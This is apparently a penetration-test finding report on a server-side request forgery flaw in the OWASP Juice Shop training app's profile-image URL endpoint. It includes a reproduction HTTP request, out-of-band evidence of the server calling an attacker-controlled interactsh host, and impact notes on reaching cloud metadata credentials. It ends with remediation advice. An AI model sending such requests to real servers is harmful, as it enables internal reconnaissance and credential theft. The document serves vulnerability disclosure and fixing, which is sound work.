# SSRF on POST /profile/image/url — server fetches attacker-controlled URL

- **Severity:** high
- **Date (UTC):** 2026-11-19

## Details

# SSRF on POST /profile/image/url

**Severity:** high
**Engagement:** juice-shop
**Date:** 2026-11-19

## Summary
`POST /profile/image/url` calls `fetch(req.body.imageUrl)` on any URL the authenticated user supplies, with no scheme or host allowlist. The server (not the browser) performs the request from its own network position, which enables attackers to reach internal services, cloud metadata endpoints, and anything reachable by the Juice Shop process.

## Steps to reproduce
1. Register and log in as a disposable test user; capture the JWT (stored in the `token` cookie by Juice Shop).
2. Start an attacker-controlled HTTP listener (canary).
3. Send:
   ```http
   POST /profile/image/url HTTP/1.1
   Host: localhost:3000
   Cookie: token=<JWT>
   Content-Type: application/x-www-form-urlencoded

   imageUrl=http://127.0.0.1:9999/juice-ssrf-26-cookie
   ```
4. Response is `302 Found` → `/profile`. The canary logs an incoming GET from `127.0.0.1` with `User-Agent: node` within milliseconds.

## Evidence

### Proof 1 — loopback canary (initial)
Local listener on 127.0.0.1:9999:
```json
{"ts":"2026-11-19T06:56:11.868759+00:00","method":"GET","path":"/juice-ssrf-26-cookie","ua":"node","client":"127.0.0.1"}
```

### Proof 2 — external OOB via interactsh (roundout re-fire)
Payload: `imageUrl=http://dbvfmald0v3ecfi5gi1gmbsf5quwpr1hk.oast.live/x`
Response: `HTTP/1.1 302 Found` → `/profile`
interactsh-client v1.4.1 captures:
```
[dbvfmald0v3ecfi5gi1gmbsf5quwpr1hk] Received DNS interaction (A) from 141.101.110.25 at 2026-11-19 14:26:13
[dbvfmald0v3ecfi5gi1gmbsf5quwpr1hk] Received DNS interaction (A) from 162.158.176.14 at 2026-11-19 14:26:13
[dbvfmald0v3ecfi5gi1gmbsf5quwpr1hk] Received HTTP interaction from 150.129.23.29 at 2026-11-19 14:26:13
```
Full evidence: `reports/juice-shop/screenshots/roundout/interactsh-ssrf-evidence.txt`.
Proves real DNS resolution and outbound HTTP egress from the Juice Shop process to an attacker-controlled host on the public internet — not just loopback.

Sink in `build/routes/profileImageUrlUpload.js:60`:
```js
const response = await fetch(url);
```
No URL validation precedes the call. On fetch error the handler stores the raw URL to `User.profileImage` (line 73), which also enables second-order reflection.

## Impact
- **Internal recon:** probe ports and services bound to `127.0.0.1` / RFC1918 ranges reachable from the Juice Shop host.
- **Cloud metadata exfil:** on AWS/GCP/Azure deployments, `http://169.254.169.254/latest/meta-data/` returns IAM credentials. Even without response body reflection, timing and the fallback behaviour (URL stored into `profileImage` on fetch error) enable confirmation.
- **Pivot:** reach any internal HTTP service without requiring direct network access.
- **Chains with:** IDOR on `/api/Users/{id}` (filed 2026-11-19) — an admin token minted via the SQLi-login bypass could trigger SSRF against internal endpoints that trust the Juice Shop host.

## Remediation
- Strict URL allowlist (not blocklist): resolve the hostname, verify it is a public-internet IP, and verify the scheme is `http(s)`.
- Block RFC1918, loopback, link-local (169.254/16), and cloud metadata ranges (including IMDSv1).
- DNS-rebinding defence: resolve once, pass the resolved IP to `fetch`, re-verify after connect.
- Prefer an egress proxy with an explicit denylist for metadata endpoints.
- On fetch error, do not persist the raw URL to the user profile.

## References
- OWASP ASVS V12.6 (SSRF)
- CWE-918 (Server-Side Request Forgery)
- OWASP Top 10 2021 A10 (Server-Side Request Forgery)
- Juice Shop challenge: `ssrfChallenge`
